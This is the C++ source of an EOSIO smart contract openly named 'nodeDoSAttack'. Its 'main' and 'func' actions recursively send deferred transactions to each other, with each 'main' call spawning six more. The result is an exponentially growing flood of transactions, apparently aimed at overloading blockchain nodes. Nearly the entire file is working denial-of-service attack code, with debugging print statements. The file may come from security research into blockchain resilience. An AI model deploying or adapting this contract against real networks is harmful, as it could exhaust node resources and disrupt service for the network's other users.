//#include <eosiolib/permission.hpp>
#include <eosiolib/eosio.hpp>
#include <eosiolib/print.hpp>
#include <eosiolib/action.hpp>
//#include <eosiolib/transaction.h>
#include <eosiolib/contract.hpp>
#include <eosiolib/permission.hpp>
#include <eosiolib/action.h>
#include <eosio/serialize.hpp>
using namespace eosio;

class [[eosio::contract]] nodeDoSAttack : public eosio::contract {
  public:
      using contract::contract;
        [[eosio::action]]
        void main(name client, uint64_t idx)
        {
            uint128_t initnum = 1;
            transaction out1{};
            transaction out2{};

            //name client = name("reset");

           // out1.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client,  uint64_t(1)) );
           // out2.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client, uint64_t(2)) );
            for(int i =0; i<3; i++){ // 1,2,3 / 2
            //    out1.actions.pop_back();
                out1.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n, std::make_tuple(client, uint64_t(initnum+(idx)+i) ));
                //out.delay_sec = 0;
                out1.send((initnum+idx+i), client, false);
                print("[+] CALL 1st: ", ((idx)+i), "\n");
            }
            for (int i = 0; i<3; i++){ // 5,6,7 /
            //    out2.actions.pop_back();
                out2.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n, std::make_tuple(client, uint64_t(initnum+(idx*5)+i) ));
                //out2.delay_sec = 0;
                out2.send((initnum+(idx*5)+i), client, false);
                print("[+] CALL 2nd: ", ((idx*5)+i), "\n");
            }
            print("[#] MAIN: ", idx);
        };
        [[eosio::action]]
        void func(name client, uint64_t idx)
        { // 123 567
            //name client = name("reset");
            transaction out{};
            out.actions.emplace_back(permission_level{client, "active"_n}, client, "main"_n, std::make_tuple(client, uint64_t(idx*100) ));
            //out.delay_sec = 0;
            out.send((idx*100), client, false);
            print("\t[#] FUNC: ", idx);
        };

};

EOSIO_DISPATCH( nodeDoSAttack, (main)(func) )

